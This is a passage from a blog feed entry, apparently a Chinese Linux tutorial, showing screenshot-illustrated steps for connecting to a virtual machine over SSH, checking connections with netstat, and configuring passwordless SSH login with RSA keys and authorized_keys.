src="https://img-blog.csdnimg.cn/20191003183858775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><p>在主机使用xshell连接虚拟机<br><img src="https://img-blog.csdnimg.cn/20191003183928447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20191003183932718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>在主机和虚拟机分别使用netstat命令查看网络连接状况<br><img src="https://img-blog.csdnimg.cn/20191003184059531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><h2 id="五-配置SSH免密码登录"><a href="#五-配置SSH免密码登录" class="headerlink" title="五 配置SSH免密码登录"></a>五 配置SSH免密码登录</h2><ol><li>克隆并启动两台linux虚拟机ssh-client和ssh-server<br><img src="https://img-blog.csdnimg.cn/20191003184112185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>在ssh-server上启动sshd服务<br><img src="https://img-blog.csdnimg.cn/20191003184209275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><p>在ssh-client上创建rsa密钥对，查看密钥对<img src="https://img-blog.csdnimg.cn/20191003184117552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>使用scp命令把ssh-client的公钥拷贝到ssh-server上的认证文件中<br>这里我是使用了 cat命令查看公钥 然后复制到client机器上的认证文件中,效果跟scp一样,只不过省去了一部分<br><img src="https://img-blog.csdnimg.cn/20191003184121597.png" alt="在这里插入图片描述"><br>将master节点上的公钥复制到authorized_keys中<br><img src="https://img-blog.csdnimg.cn/2019100318414544.png" alt="在这里插入图片描述"><br>然后将slave1复制到master的authorized_keys中</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20191003184310310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将authorized_keys文件复制到其他机器</p><p><img src="https://img-blog.csdnimg.cn/20191003184322481.png" alt="在这里插入图片描述"></p><ol start="5"><li>在ssh-client使用ssh登录ssh-serve</li></ol><p><img src="https://img-blog.csdnimg.cn/20191003184326605.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令和路径&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;t
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
</feed>
